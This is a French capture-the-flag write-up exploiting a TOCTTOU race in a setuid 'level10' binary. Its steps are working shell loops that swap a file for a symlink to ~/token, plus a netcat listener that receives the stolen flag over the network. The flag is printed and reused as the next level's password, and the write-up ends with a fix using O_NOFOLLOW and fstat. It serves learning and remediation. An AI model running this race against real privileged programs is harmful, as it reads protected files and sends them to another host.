# Rapport de Vulnérabilité : Exploitation d'une Race Condition TOCTTOU dans `level10`

## Description
Cette faille repose sur une vulnérabilité de type **Race Condition TOCTTOU** (Time-of-Check to Time-of-Use) présente dans l'exécutable `level10`. Le programme vérifie d'abord les permissions d'accès à un fichier avec `access()`, puis l'ouvre avec `open()` pour le transmettre via le réseau. Le délai entre ces deux opérations peut être exploité pour substituer le fichier vérifié par un lien symbolique pointant vers le fichier `~/token` contenant le flag.

## Comment Exploiter la Faille

### Étape 1 : Analyse du comportement du programme
```bash
./level10 file host
```
**Message affiché :**
```
sends file to host if you have access to it
```

**Test avec un fichier accessible :**
```bash
echo "bonjour" > /tmp/test1
./level10 /tmp/test1 192.168.56.102
```
**Résultat :**
```
Connecting to 192.168.56.102:6969 .. Unable to connect to host 192.168.56.102
```

### Étape 2 : Configuration du serveur d'écoute
```bash
nc -l -k 192.168.56.102 6969
```
**Résultat après relancement de level10 :**
```
.*( )*.
bonjour
```

Le programme fonctionne : il vérifie les permissions puis transmet le contenu du fichier au port 6969.

### Étape 3 : Identification de la vulnérabilité
**Analyse avec `strings` :**
```bash
strings level10
```
**Extrait pertinent :**
```
level10.c
stdio.h
socket.h
access
open
```

La présence de `access` et `open` suggère une vulnérabilité TOCTTOU classique.

### Étape 4 : Préparation de l'exploitation

Étant donné les restrictions d'accès de l'utilisateur courant, l'exploitation se fait directement en ligne de commande sans création de fichiers scripts.

**Commande 1 - Attaque continue :**
```bash
while true; do ./level10 /tmp/payload 192.168.56.102 2>/dev/null; done
```

**Commande 2 - Manipulation rapide des fichiers :**
```bash
while true; do echo "test" > /tmp/payload; rm /tmp/payload; ln -s ~/token /tmp/payload; rm /tmp/payload; done
```

### Étape 5 : Lancement de l'exploitation

**Terminal 1 - Serveur d'écoute :**
```bash
nc -l -k 192.168.56.102 6969
```

**Terminal 2 - Attaque continue :**
```bash
while true; do ./level10 /tmp/payload 192.168.56.102 2>/dev/null; done
```

**Terminal 3 - Manipulation des fichiers :**
```bash
while true; do echo "test" > /tmp/payload; rm /tmp/payload; ln -s ~/token /tmp/payload; rm /tmp/payload; done
```

### Étape 6 : Récupération du flag

Après quelques secondes d'exécution parallèle, le serveur netcat reçoit :
```
.*( )*.
woupa2yuojeeaaed06riuj63c
```

**Flag obtenu :**
```
woupa2yuojeeaaed06riuj63c
```

### Étape 7 : Passage au niveau suivant
```bash
su level11
```
**Mot de passe :**
```
woupa2yuojeeaaed06riuj63c
```

---

## Mécanisme de la Race Condition

### Séquence vulnérable dans level10 :
1. **Check** : `access("/tmp/payload", R_OK)` → Vérification des permissions ✓
2. **Délai exploitable** : Quelques microsecondes
3. **Use** : `open("/tmp/payload", O_RDONLY)` → Ouverture du fichier

### Timing d'exploitation :
- **Script 1** bombarde continuellement le programme avec des tentatives
- **Script 2** effectue rapidement la séquence :
  - Création fichier légitime → `access()` passe ✓
  - Suppression + création lien symbolique → `open()` lit le token ✓
  - Suppression du lien

**Résultat :** Le programme lit `~/token` alors qu'il a vérifié les permissions sur un fichier différent.

---

## Comment Résoudre la Faille

Pour corriger cette vulnérabilité :

* **Éviter la séparation check/use** : Utiliser directement `open()` et vérifier les permissions sur le descripteur de fichier ouvert avec `fstat()`.

* **Vérifications atomiques** : Implémenter des contrôles d'accès qui ne peuvent pas être contournés par des modifications concurrentes du système de fichiers.

* **Utilisation de `O_NOFOLLOW`** : Empêcher le suivi des liens symboliques lors de l'ouverture de fichiers.

**Code sécurisé suggéré :**
```c
fd = open(filename, O_RDONLY | O_NOFOLLOW);
if (fd == -1) {
    perror("access denied");
    return -1;
}
fstat(fd, &st);  // Vérifier sur le fichier réellement ouvert
```

## Conclusion

Cette vulnérabilité illustre parfaitement les dangers des Race Conditions dans les programmes avec privilèges élevés. La séparation temporelle entre la vérification des permissions et l'utilisation de la ressource crée une fenêtre d'attaque exploitable. Une approche atomique des vérifications de sécurité est essentielle pour prévenir ce type d'exploitation.

---